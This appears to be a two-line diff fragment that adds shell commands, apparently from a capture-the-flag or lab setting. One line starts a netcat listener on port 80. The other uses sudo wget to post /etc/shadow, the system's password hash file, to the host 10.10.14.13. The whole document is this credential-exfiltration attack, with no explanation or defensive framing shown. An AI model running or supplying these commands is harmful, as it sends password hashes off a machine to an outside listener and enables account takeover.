@@ -1,0 +1,2 @@
+nc -lvnp 80
+sudo wget --post-file=/etc/shadow 10.10.14.13
